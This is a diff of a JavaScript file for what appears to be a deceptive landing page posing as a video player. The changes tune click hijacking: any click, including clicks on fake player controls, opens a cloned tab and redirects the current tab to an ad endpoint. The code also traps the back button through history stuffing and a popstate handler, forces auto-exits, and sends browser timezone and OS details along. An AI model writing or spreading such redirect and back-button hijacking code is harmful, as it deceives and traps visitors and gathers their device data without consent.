@@ -1,4 +1,4 @@
-/* common.js — vanisher-style micro handoff (fixed)
+/* common.js — vanisher-style micro handoff (fixed v3)
    v1:
      - micro targets -> open CLONE tab, current tab redirects to TABUNDER (AFU)
      - everything else -> MAIN EXIT (even before ready)
@@ -6,9 +6,9 @@
      - ANY click anywhere -> MAIN EXIT (micro disabled)
 
    Fixes:
-   - before READY: non-micro clicks trigger mainExit (no "only back.html in URL")
-   - dual-tab exit: fallback redirect if tab stays visible (mobile chrome cases)
-   - back pushState: restores original URL correctly
+   - no visibilitychange dependency for dual-exit (redirect current immediately)
+   - reverse is armed via pushState trap on boot (no click-capture initBack that breaks first click)
+   - keep back.html stuffing only when we actually EXIT (main/micro/back/autoexit)
 */
 
 (() => {
@@ -67,6 +67,7 @@
   const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
   const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;
 
+  // optional (do not block exits)
   const getOsVersion = async () => {
     try {
       const nav = navigator;
@@ -77,9 +78,8 @@
       return "";
     }
   };
-
-  // cache (avoid repeated delays)
-  const osVersionPromise = getOsVersion();
+  let osVersionCached = "";
+  safe(() => getOsVersion().then(v => { osVersionCached = v || ""; }));
 
   const buildCmeta = () => {
     try {
@@ -137,9 +137,9 @@
   };
 
   // ---------------------------
-  // AFU URL builder
+  // Fast AFU URL builder (no awaits)
   // ---------------------------
-  const buildExitQS = async ({ zoneId, passParamToParams }) => {
+  const buildExitQSFast = ({ zoneId }) => {
     const ab2r =
       IN.abtest ||
       (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
@@ -152,7 +152,7 @@
       campaignid: IN.campaignid || "",
       click_id: IN.s || "",
       rhd: IN.rhd || "1",
-      os_version: (await osVersionPromise) || "",
+      os_version: osVersionCached || "",
       btz: getTimezoneName(),
       bto: String(getTimezoneOffset()),
       cmeta: buildCmeta(),
@@ -164,33 +164,15 @@
     };
 
     if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
-
-    let qs = qsFromObj(base);
-
-    if (Array.isArray(passParamToParams)) {
-      try {
-        passParamToParams.forEach(({ from, to, joinWith }) => {
-          if (!to?.length) return;
-          let val = "";
-          if (Array.isArray(from)) {
-            val = from.map(k => curUrl.searchParams.get(k) || "").filter(Boolean).join(joinWith ?? "");
-          } else if (typeof from === "string") {
-            val = curUrl.searchParams.get(from) || "";
-          }
-          if (val) to.forEach(k => qs.set(k, val));
-        });
-      } catch {}
-    }
-
-    return qs;
+    return qsFromObj(base);
   };
 
-  const generateAfuUrl = async (zoneId, domain, passParamToParams) => {
+  const generateAfuUrlFast = (zoneId, domain) => {
     const host = String(domain || "").trim();
-    if (!host) throw new Error("Empty domain");
+    if (!host) return "";
     const base = host.startsWith("http") ? host : `https://${host}`;
     const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
-    url.search = (await buildExitQS({ zoneId, passParamToParams })).toString();
+    url.search = buildExitQSFast({ zoneId }).toString();
     return url.toString();
   };
 
@@ -200,7 +182,7 @@
   const pushBackStates = (url, count) => {
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
-      const originalUrl = window.location.href; // MUST capture before pushState changes address bar
+      const originalUrl = window.location.href;
 
       for (let i = 0; i < n; i++) {
         window.history.pushState(null, "Please wait...", url);
@@ -220,7 +202,7 @@
     return `${origin}${dir}/back.html`;
   };
 
-  const initBack = async (cfg) => {
+  const initBackFast = (cfg) => {
     const b = cfg?.back?.currentTab;
     if (!b) return;
 
@@ -228,7 +210,7 @@
     const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
     const page = new URL(pageUrl, window.location.href);
 
-    const qs = await buildExitQS({ zoneId: b.zoneId });
+    const qs = buildExitQSFast({ zoneId: b.zoneId });
 
     // router params for your back.html
     if (b.url) {
@@ -243,97 +225,55 @@
   };
 
   // ---------------------------
-  // Exits
+  // Exits (fast, no visibilitychange dependency)
   // ---------------------------
-  const runExitCurrentTab = async (cfg, name, withBack = true) => {
+  const resolveUrlFast = (ex, cfg) => {
+    if (!ex) return "";
+    if (ex.url) return String(ex.url);
+    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
+    return "";
+  };
+
+  const runExitCurrentTabFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name]?.currentTab;
     if (!ex) return;
 
-    let url = "";
-    if (ex.zoneId && ex.domain) url = await generateAfuUrl(ex.zoneId, ex.domain);
-    else if (ex.url) url = String(ex.url);
-    else return;
+    const url = resolveUrlFast(ex, cfg);
+    if (!url) return;
 
     safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
-    if (withBack) await initBack(cfg);
+    if (withBack) initBackFast(cfg);
     replaceTo(url);
   };
 
-  // Dual-tabs with fallback (if page stays visible, redirect current anyway)
-  const runExitDualTabs = async (cfg, name, withBack = true) => {
+  const runExitDualTabsFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name];
     if (!ex) return;
 
     const ct = ex.currentTab;
     const nt = ex.newTab;
 
-    let ctUrl = "", ntUrl = "";
-
-    if (ct) {
-      if (ct.zoneId && ct.domain) ctUrl = await generateAfuUrl(ct.zoneId, ct.domain);
-      else if (ct.url) ctUrl = String(ct.url);
-    }
-    if (nt) {
-      if (nt.zoneId && nt.domain) ntUrl = await generateAfuUrl(nt.zoneId, nt.domain);
-      else if (nt.url) ntUrl = String(nt.url);
-    }
+    const ctUrl = resolveUrlFast(ct, cfg);
+    const ntUrl = resolveUrlFast(nt, cfg);
 
     safe(() => {
       if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
       if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
     });
 
-    if (withBack) await initBack(cfg);
+    if (withBack) initBackFast(cfg);
 
-    if (!ntUrl) {
-      if (ctUrl) replaceTo(ctUrl);
-      return;
-    }
-
-    const w = openTab(ntUrl);
-
-    // If newTab failed, just redirect current immediately.
-    if (!w) {
-      if (ctUrl) replaceTo(ctUrl);
-      return;
-    }
-
-    // If we have currentTab URL, do:
-    // - redirect on return (visibilitychange)
-    // - BUT if tab stays visible (common mobile case) => redirect after short delay
-    if (ctUrl) {
-      let done = false;
-
-      const cleanup = () => {
-        document.removeEventListener("visibilitychange", onVis);
-      };
-
-      const doRedirect = () => {
-        if (done) return;
-        done = true;
-        cleanup();
-        replaceTo(ctUrl);
-      };
-
-      const onVis = () => {
-        if (document.visibilityState === "visible") doRedirect();
-      };
-
-      document.addEventListener("visibilitychange", onVis);
-
-      // Fallback: if still visible shortly after openTab, redirect now
-      setTimeout(() => {
-        if (!done && document.visibilityState === "visible") doRedirect();
-      }, 250);
-    }
+    if (ntUrl) openTab(ntUrl);
+    if (ctUrl) replaceTo(ctUrl);
   };
 
-  const run = async (cfg, name) => {
+  const run = (cfg, name) => {
     if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
-      return runExitDualTabs(cfg, "mainExit", true);
+      // fallback: if micro zone missing -> behave as mainExit
+      return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true) : runExitCurrentTabFast(cfg, "mainExit", true);
     }
-    if (cfg?.[name]?.newTab) return runExitDualTabs(cfg, name, true);
-    return runExitCurrentTab(cfg, name, true);
+    if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
+    return runExitCurrentTabFast(cfg, name, true);
   };
 
   // ---------------------------
@@ -342,23 +282,12 @@
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
 
-    let armed = false;
-
-    window.addEventListener("click", async () => {
-      if (armed) return;
-      armed = true;
-
-      try {
-        await initBack(cfg);
-        const keep = window.location.pathname + window.location.search;
-        window.history.pushState(null, "", keep);
-      } catch (e2) {
-        err("Reverse arm error:", e2);
-      }
-    }, { capture: true, once: true });
+    // trap state without changing URL
+    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
 
     window.addEventListener("popstate", () => {
-      runExitCurrentTab(cfg, "reverse", false).catch(err);
+      // back pressed -> reverse exit
+      runExitCurrentTabFast(cfg, "reverse", false);
     });
   };
 
@@ -370,7 +299,7 @@
     let armed = false;
     const trigger = () => {
       if (document.visibilityState === "visible" && armed) {
-        runExitCurrentTab(cfg, "autoexit", true).catch(err);
+        runExitCurrentTabFast(cfg, "autoexit", true);
       }
     };
 
@@ -389,7 +318,7 @@
   };
 
   // ---------------------------
-  // READY flag (kept for logic, but mainExit must work even before ready)
+  // READY flag (kept for debug; mainExit works even before ready)
   // ---------------------------
   const isPlayerReady = () => {
     const btn = document.querySelector(".xh-main-play-trigger");
@@ -408,34 +337,26 @@
     return u.toString();
   };
 
-  const buildTabUnderUrl = async (cfg) => {
-    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
-    if (!ex) return "";
-
-    if (ex.zoneId && ex.domain) return await generateAfuUrl(ex.zoneId, ex.domain);
-    if (ex.url) return String(ex.url);
-    return "";
-  };
-
-  const runMicroHandoff = async (cfg) => {
+  const runMicroHandoff = (cfg) => {
     if (isClone) return;
 
     if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
-      // second micro attempt -> treat as mainExit (by your spec: after micro, clone does main; v1 also can degrade)
       return run(cfg, "mainExit");
     }
-
     safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
 
-    // popup-safe: open clone BEFORE awaits
+    // open clone tab immediately
     const cloneUrl = buildCloneUrl();
     safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
     openTab(cloneUrl);
 
-    const monetUrl = await buildTabUnderUrl(cfg);
+    // redirect current to TABUNDER immediately (with back stuffing)
+    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
+    const monetUrl = resolveUrlFast(ex, cfg);
 
     if (monetUrl) {
       safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
+      initBackFast(cfg);
       replaceTo(monetUrl);
     } else {
       run(cfg, "mainExit");
@@ -448,7 +369,6 @@
   const initClickMap = (cfg) => {
     const fired = { mainExit: false, back: false };
 
-    // your micro targets
     const microTargets = new Set([
       "timeline",
       "play_pause",
@@ -459,51 +379,51 @@
       "pip_bottom",
     ]);
 
-    document.addEventListener("click", async (e) => {
+    document.addEventListener("click", (e) => {
       const zone = e.target?.closest?.("[data-target]");
       const t = zone?.getAttribute("data-target") || "";
 
-      // UI back button (separate exit)
+      // Back UI button
       if (t === "back_button") {
         if (fired.back) return;
         fired.back = true;
         e.preventDefault();
         e.stopPropagation();
-        runExitCurrentTab(cfg, "back", true).catch(err);
+        runExitCurrentTabFast(cfg, "back", true);
         return;
       }
 
-      // CLONE: any click -> mainExit (no micro, no ready gate)
+      // Clone: any click -> mainExit
       if (isClone) {
         if (fired.mainExit) return;
         fired.mainExit = true;
         e.preventDefault();
         e.stopPropagation();
-        run(cfg, "mainExit").catch(err);
+        run(cfg, "mainExit");
         return;
       }
 
-      // v1: micro targets -> micro handoff (allowed even before ready)
+      // Micro -> micro handoff (works even before ready)
       if (microTargets.has(t)) {
         e.preventDefault();
         e.stopPropagation();
-        runMicroHandoff(cfg).catch(err);
+        runMicroHandoff(cfg);
         return;
       }
 
-      // v1: everything else -> MAIN EXIT (IMPORTANT: even before READY)
+      // Everything else -> mainExit (IMPORTANT: even before ready)
       if (fired.mainExit) return;
       fired.mainExit = true;
       e.preventDefault();
       e.stopPropagation();
-      run(cfg, "mainExit").catch(err);
+      run(cfg, "mainExit");
     }, true);
   };
 
   // ---------------------------
   // Boot
   // ---------------------------
-  const boot = async () => {
+  const boot = () => {
     if (typeof window.APP_CONFIG === "undefined") {
       document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
       return;
@@ -515,7 +435,7 @@
     window.LANDING_EXITS = {
       cfg,
       run: (name) => run(cfg, name),
-      initBack: () => initBack(cfg),
+      initBack: () => initBackFast(cfg),
       microHandoff: () => runMicroHandoff(cfg),
       isPlayerReady,
     };
@@ -525,7 +445,6 @@
     initReverse(cfg);
   };
 
-  // execute asap (defer scripts run at parse end; readyState usually "interactive")
   if (document.readyState === "loading") {
     document.addEventListener("DOMContentLoaded", boot);
   } else {
